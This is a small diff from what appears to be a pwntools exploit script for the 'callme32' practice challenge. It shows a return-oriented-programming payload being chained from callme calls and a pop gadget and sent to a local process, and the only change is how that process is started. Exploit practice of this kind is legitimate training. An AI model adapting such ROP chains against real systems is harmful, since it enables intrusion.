@@ -17,8 +17,7 @@ payload += callmeTwo + popGadget + params
 payload += callmeThree + popGadget + params
 
 
-io = process("./callme32")
-
+io = e.process()
 
 io.sendline(payload)
 
